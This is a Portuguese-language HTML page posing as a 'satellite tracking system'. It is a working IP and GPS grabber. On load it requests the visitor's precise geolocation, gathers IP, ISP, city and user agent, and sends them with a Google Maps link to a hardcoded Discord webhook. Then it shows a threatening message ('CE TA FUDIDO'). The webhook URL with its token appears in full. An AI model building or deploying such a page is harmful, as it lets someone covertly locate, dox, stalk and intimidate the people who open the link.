<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SISTEMA DE RASTREIO ATIVO</title>
    <style>
        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-align: center; }
        .container { border: 2px solid #ff0000; padding: 40px; background: #1a0000; box-shadow: 0 0 30px #ff0000; max-width: 400px; }
        .glitch { font-size: 1.2rem; font-weight: bold; text-transform: uppercase; animation: blink 1s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .loader { border: 3px solid #330000; border-top: 3px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 3.5rem; color: #ff0000; display: none; margin: 0; text-shadow: 0 0 20px #ff0000; }
    </style>
</head>
<body>

    <div class="container" id="main-box">
        <div id="ui-elements">
            <div class="loader"></div>
            <div class="glitch">Sincronizando com Sat√©lite...</div>
            <p style="font-size: 0.8rem; color: #888; margin-top: 15px;">Protocolo de captura IP/GPS em execu√ß√£o.</p>
        </div>
        <h1 id="fudido">CE TA FUDIDO</h1>
    </div>

    <script>
        // SEU WEBHOOK ATUALIZADO
        const WEBHOOK = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";

        async function enviar(pos = null) {
            try {
                // Pega dados do IP (Mesmo que diga Amazon, a gente registra)
                const ipRes = await fetch('https://ipapi.co/json/');
                const ip = await ipRes.json();

                let desc = `**üåê Internet:** ${ip.org}\n**üìç Cidade (IP):** ${ip.city}\n**üì± Aparelho:** ${navigator.userAgent}`;
                
                if (pos) {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    // O Google Maps ignora a VPN/Amazon e mostra a casa do cara
                    desc += `\n\nüéØ **LOCALIZA√á√ÉO REAL (GPS):**\nhttps://www.google.com/maps?q=${lat},${lon}`;
                } else {
                    desc += `\n\n‚ö†Ô∏è **GPS NEGADO:** Localiza√ß√£o aproximada pelo IP.`;
                }

                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "üö© NOVO ALVO LOGADO",
                            description: desc,
                            color: 16711680,
                            timestamp: new Date()
                        }]
                    })
                });

                // Troca para a tela final
                document.getElementById('ui-elements').style.display = 'none';
                document.getElementById('main-box').style.background = '#000';
                document.getElementById('fudido').style.display = 'block';

            } catch (e) {
                console.log("Erro de conex√£o.");
            }
        }

        window.onload = () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (p) => enviar(p), 
                    () => enviar(), // Se o cara negar, manda o IP da Amazon mesmo
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else {
                enviar();
            }
        };
    </script>
</body>
</html>
